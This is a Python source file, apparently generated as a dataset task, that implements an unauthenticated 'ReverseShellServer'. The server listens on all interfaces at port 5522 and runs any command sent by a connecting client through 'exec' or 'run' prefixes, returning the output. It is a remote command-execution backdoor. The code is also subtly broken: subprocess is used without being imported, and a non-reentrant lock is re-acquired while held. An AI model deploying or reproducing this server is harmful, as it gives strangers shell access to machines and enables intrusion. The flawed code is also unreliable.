import socket
import threading
from typing import Optional, List, Tuple
from data.code_scripts_PAST.stage3_DIMOS_test_v6.TASK_001_shell_result import ConnectionInfo, ShellCommand, ExecutionResult
from data.code_scripts_PAST.stage3_DIMOS_test_v6.TASK_002_shell_utils import spawn_shell_process, capture_output_stream, parse_command_args, validate_connection_info


class CommandExecutor:
    """Executes shell commands and captures their output."""

    def __init__(self) -> None:
        self._lock = threading.Lock()

    def execute(self, command: str, timeout_seconds: float = 30.0) -> ExecutionResult:
        """Execute a shell command and capture its output.

        Args:
            command: The shell command to execute.
            timeout_seconds: Maximum time to wait for execution.

        Returns:
            An ExecutionResult containing stdout, stderr, return code, and duration.
        """
        with self._lock:
            args = parse_command_args(command)
            process = spawn_shell_process(
                host="localhost",
                port=5522,
                protocol='ssh',
                command=command,
                timeout_seconds=timeout_seconds
            )

            try:
                result = capture_output_stream(process, timeout_seconds=timeout_seconds)
                return result
            except TimeoutError as e:
                with self._lock:
                    process.terminate()
                raise
            except RuntimeError as e:
                with self._lock:
                    process.terminate()
                raise

    def execute_interactive(self, host: str = "localhost", port: int = 5522) -> subprocess.Popen:
        """Spawn an interactive shell session.

        Args:
            host: The target host address.
            port: The target port number.

        Returns:
            A Popen object representing the spawned shell process.
        """
        with self._lock:
            return spawn_shell_process(
                host=host,
                port=port,
                protocol='ssh',
                command=None,
                timeout_seconds=30.0
            )


class RemoteConnectionHandler(threading.Thread):
    """Handles a single remote connection and executes commands."""

    def __init__(self, client_socket: socket.socket, executor: CommandExecutor) -> None:
        super().__init__()
        self.client_socket = client_socket
        self.executor = executor
        self.daemon = True

    def run(self) -> None:
        """Handle the remote connection lifecycle."""
        try:
            self._handle_connection()
        except Exception as e:
            self._send_error(f"Connection error: {str(e)}")
        finally:
            self.client_socket.close()

    def _handle_connection(self) -> None:
        """Process commands from the remote client."""
        try:
            while True:
                data = self.client_socket.recv(4096)
                if not data:
                    break

                command_str = data.decode('utf-8', errors='replace').strip()

                if not command_str:
                    continue

                if command_str == "exit":
                    break

                if command_str.startswith("exec "):
                    cmd = command_str[5:].strip()
                    result = self.executor.execute(cmd)
                    response = f"stdout={result.stdout}\nstderr={result.stderr}\nreturn_code={result.return_code}\nduration_ms={result.duration_ms:.2f}"
                elif command_str.startswith("run "):
                    cmd = command_str[4:].strip()
                    result = self.executor.execute(cmd)
                    response = f"stdout={result.stdout}\nstderr={result.stderr}\nreturn_code={result.return_code}\nduration_ms={result.duration_ms:.2f}"
                else:
                    response = f"Command received: {command_str}\nExecuting..."

                self._send_response(response)
        except socket.error as e:
            raise ConnectionError(f"Socket error: {str(e)}") from e

    def _send_response(self, data: str) -> None:
        """Send a response back to the client."""
        try:
            encoded = data.encode('utf-8')
            self.client_socket.sendall(encoded)
        except socket.error as e:
            raise ConnectionError(f"Send error: {str(e)}") from e

    def _send_error(self, message: str) -> None:
        """Send an error message to the client."""
        try:
            encoded = f"ERROR: {message}\n".encode('utf-8')
            self.client_socket.sendall(encoded)
        except socket.error:
            pass


class ReverseShellServer:
    """Main reverse shell server that listens on 0.0.0.0:5522."""

    HOST = "0.0.0.0"
    PORT = 5522
    DEFAULT_TIMEOUT_SECONDS = 30.0

    def __init__(self, host: str = None, port: int = None) -> None:
        self.host = host or self.HOST
        self.port = port or self.PORT
        self.server_socket: Optional[socket.socket] = None
        self.executor = CommandExecutor()
        self._running = False

    def start(self) -> None:
        """Start the server and begin listening for connections."""
        if self.server_socket is not None:
            return

        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self._running = True

            print(f"[+] ReverseShellServer listening on {self.host}:{self.port}")
        except OSError as e:
            raise ConnectionError(f"Failed to bind to {self.host}:{self.port}: {str(e)}") from e

    def stop(self) -> None:
        """Stop the server and close all sockets."""
        self._running = False
        if self.server_socket is not None:
            try:
                self.server_socket.close()
            except socket.error:
                pass
            finally:
                self.server_socket = None

    def run(self) -> None:
        """Main server loop - accept connections and spawn threads."""
        while self._running:
            try:
                client_socket, addr = self.server_socket.accept()
                handler = RemoteConnectionHandler(client_socket, self.executor)
                handler.start()
            except socket.error as e:
                if not self._running:
                    break
                raise ConnectionError(f"Accept error: {str(e)}") from e

    def __enter__(self) -> "ReverseShellServer":
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self.stop()


def main() -> None:
    """Entry point for the reverse shell server."""
    server = ReverseShellServer(host="0.0.0.0", port=5522)

    try:
        server.start()
        server.run()
    except KeyboardInterrupt:
        print("\n[-] Server stopped by user.")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
